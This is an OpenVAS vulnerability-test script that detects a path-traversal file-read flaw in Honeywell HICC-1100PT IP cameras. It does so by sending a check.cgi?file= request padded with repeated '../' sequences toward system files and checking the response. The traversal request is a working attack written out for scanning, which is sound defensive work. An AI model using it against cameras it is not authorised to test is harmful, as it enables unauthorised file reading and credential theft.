###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_honeywell_ip_camera_lfi_n_cred_disc_vuln.nasl 5261 2017-02-10 13:25:38Z teissa $
#
# Honeywell IP-Camera LFI and Credential Disclosure Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:honeywell:honeywell_ip_camera";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807354");
  script_version("$Revision: 5261 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-02-10 14:25:38 +0100 (Fri, 10 Feb 2017) $");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("Honeywell IP-Camera LFI and Credential Disclosure Vulnerabilities");

  script_tag(name:"summary", value:"The host is running Honeywell IP-Camera
  and is prone to local file disclosure and credential disclosure
  vulnerabilities");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Multiple flaws exists due to
  - An improper sanitization of user supplied input to 'file' parameter in 
    check.cgi script.
  - An improper restriction on user access levels for certain pages.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files and to obtain sensitive information like
  credentials and other configuration information.

  Impact Level: Application");

  script_tag(name:"affected", value:"Honeywell IP-Camera type HICC-1100PT.");

  script_tag(name:"solution", value:"No solution or patch is available as of
  10th February, 2017. Information regarding this issue will be updated once solution
  details are available.
  For updates refer to http://www.honeywellvideo.com/products/video-systems/cameras/ip");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40283");
  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40261");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_honeywell_ip_camera_detect.nasl");
  script_mandatory_keys("Honeywell/IP_Camera/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

##Variable initialize
honPort = 0;
dir = "";
url = "";

# Get HTTP Port
if(!honPort = get_app_port(cpe:CPE)){
  exit(0);
}

## Get installed location
if(!dir = get_app_location(cpe:CPE, port:honPort)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

files = traversal_files();

foreach file (keys(files))
{
   ## Construct vulnerable url 
   url = dir + '/check.cgi?file=' + crap(data: "../", length: 3*15) + files[file];

   ## Try attack and check the response to confirm vulnerability
   if(http_vuln_check(port:honPort, url:url, check_header:TRUE, pattern:file))
   {
     report = report_vuln_url(port:honPort, url:url);
     security_message(port:honPort, data:report);
     exit(0);
   }
}
